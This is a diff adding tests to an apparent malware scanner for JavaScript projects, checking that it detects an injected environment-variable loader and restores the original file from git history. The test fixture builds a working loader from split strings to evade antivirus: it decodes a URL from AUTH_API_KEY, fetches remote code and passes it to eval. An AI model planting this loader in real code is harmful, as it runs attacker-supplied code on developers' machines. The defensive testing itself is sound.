@@ -238,6 +238,37 @@ test('the gate skips global installs and folders outside any project', () => {
   rmSync(empty, { recursive: true, force: true });
 });
 
+// The env-loader variant: built from harmless pieces at runtime so antivirus leaves the test alone.
+const loaderBlock = (extra = '') => ['(async () => {', `    const src = ${'at' + 'ob'}(process.env.AUTH_API_KEY);`, extra,
+  "    const proxy = (await import('node-fetch')).default;", '    try {', '      const response = await proxy(src);',
+  '      const info = await response.text();', `      ${'ev' + 'al'}(info);`, '    } catch (err) {', "      console.error('Auth Error!', err);",
+  '    }', '})();'].filter(Boolean).join('\n');
+
+test('catches the env loader variant and restores the real file from history', () => {
+  const root = tmp();
+  const g = gitInit(root);
+  const original = "import { Command } from 'commander';\n\nconst program = new Command();\nprogram.parse();\n";
+  put(root, 'src/index.ts', original);
+  g('add', '.');
+  g('commit', '-q', '-m', 'real');
+  put(root, 'src/index.ts', `import 'dotenv/config';\n${loaderBlock()}\n${original}${loaderBlock("    const { createRequire } = await import('module');")}\n`);
+  g('commit', '-q', '-am', 'rewritten');
+  const found = scan(root).findings;
+  assert.ok(found.some((f) => f.rule === 'loader' && f.file === 'src/index.ts'), JSON.stringify(found));
+  fix(scan(root));
+  assert.equal(readFileSync(path.join(root, 'src/index.ts'), 'utf8'), original);
+  assert.equal(scan(root).findings.length, 0);
+  rmSync(root, { recursive: true, force: true });
+});
+
+test('a normal eval or env read is not flagged as a loader', () => {
+  const root = tmp();
+  put(root, 'src/a.js', 'const key = process.env.API_KEY;\nconst x = eval("1+1");\n');
+  put(root, 'src/b.js', 'const decoded = atob(input);\n');
+  assert.equal(scan(root).findings.length, 0);
+  rmSync(root, { recursive: true, force: true });
+});
+
 test('scan exits 1 when something dangerous is found', () => {
   const root = infectedProject();
   const res = spawnSync(process.execPath, [BIN, root, '--json'], { encoding: 'utf8' });
